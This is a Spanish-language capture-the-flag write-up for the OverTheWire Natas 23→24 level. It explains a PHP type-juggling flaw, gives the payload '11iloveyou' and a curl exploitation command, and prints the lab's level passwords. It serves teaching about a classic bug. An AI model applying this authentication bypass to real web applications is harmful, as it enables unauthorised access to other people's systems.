# Natas 23 → 24

## Información del nivel

| Campo | Valor |
|---|---|
| URL | http://natas23.natas.labs.overthewire.org |
| Usuario | natas23 |
| Contraseña | dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs |
| Contraseña obtenida | MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd |

---

## Reconocimiento

La página presenta un formulario con un campo de texto `passwd`. El código fuente revela las condiciones que debe cumplir el input.

---

## Análisis del código fuente

```php
if(array_key_exists("passwd",$_REQUEST)){
    if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10)){
        echo "Password: <censored>";
    }
}
```

Hay dos condiciones que deben cumplirse simultáneamente:

1. `strstr($_REQUEST["passwd"], "iloveyou")` → el valor debe **contener** el string `iloveyou`
2. `$_REQUEST["passwd"] > 10` → el valor debe ser **mayor que 10**

---

## Vulnerabilidad: PHP Type Juggling

En PHP, cuando se compara un string con un número usando operadores como `>`, PHP convierte automáticamente el string a número. Esta conversión toma los dígitos del **inicio** del string:

| Input | Conversión PHP | Resultado `> 10` |
|---|---|---|
| `"11iloveyou"` | `11` | ✓ verdadero |
| `"5iloveyou"` | `5` | ✗ falso |
| `"iloveyou11"` | `0` | ✗ falso |

Este comportamiento se llama **Type Juggling** — PHP convierte tipos automáticamente según el contexto. Es una fuente clásica de vulnerabilidades porque el resultado no siempre es intuitivo.

---

## ¿Qué es `strstr()`?

Es una función PHP que busca la primera ocurrencia de un string dentro de otro. Devuelve el string desde esa posición si lo encuentra, o `false` si no.

```php
strstr("11iloveyou", "iloveyou") // devuelve "iloveyou" → verdadero
strstr("hola", "iloveyou")       // devuelve false
```

---

## Payload

Un solo valor que cumpla ambas condiciones:

```
11iloveyou
```

- Empieza con `11` → PHP lo convierte a `11 > 10` ✓
- Contiene `iloveyou` → `strstr()` devuelve verdadero ✓

---

## Explotación

```bash
curl -s "http://natas23.natas.labs.overthewire.org/?passwd=11iloveyou" \
  -u natas23:dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs | grep -i password
```

---

## Conceptos clave

- **Type Juggling**: conversión automática de tipos en PHP al comparar valores de tipos diferentes. Puede producir resultados inesperados y vulnerabilidades de autenticación.
- **`strstr()`**: función PHP para buscar substrings. Devuelve el string desde la coincidencia o `false`.
- **Método GET**: los parámetros van en la URL con `?clave=valor`.
